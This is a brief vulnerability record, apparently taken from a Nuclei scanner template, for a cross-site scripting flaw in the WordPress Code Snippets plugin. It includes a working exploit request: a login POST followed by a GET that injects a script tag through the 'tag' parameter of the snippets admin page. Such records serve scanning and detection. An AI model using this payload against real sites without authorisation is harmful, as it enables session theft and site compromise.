# Vulnerability: WordPress Code Snippets - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`wp-code-snippets-xss.yaml`)

## Description
WordPress Code Snippets plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

